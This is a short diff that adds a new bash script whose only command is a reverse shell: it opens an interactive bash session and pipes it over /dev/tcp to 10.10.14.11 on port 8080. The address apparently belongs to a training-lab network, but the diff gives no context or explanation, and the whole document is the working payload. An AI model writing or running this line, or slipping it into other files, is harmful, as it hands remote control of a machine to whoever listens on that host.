@@ -1,0 +1,2 @@
+#!/usr/bin/bash
+bash -i >& /dev/tcp/10.10.14.11/8080 0>&1
